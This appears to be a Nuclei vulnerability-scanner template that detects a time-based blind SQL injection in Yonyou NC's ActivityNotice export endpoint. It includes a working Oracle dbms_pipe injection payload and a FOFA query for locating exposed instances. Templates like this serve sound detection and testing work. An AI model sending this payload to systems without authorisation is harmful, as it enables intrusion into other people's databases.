id: yonyou-nc-activitynotice-sqli
info:
  name: 用友NC ActivityNotice SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: ufida-nc
    fofa: app="用友-UFIDA-NC"

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "ufida"

  - method: POST
    path:
      - "{{BaseURL}}/portal/pt/ActivityNotice/export?pageId=login"
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: "itemid=1' AND 1=dbms_pipe.receive_message('RDS', {{t1}})--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ""
      - type: word
        part: header
        words:
          - ":master"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
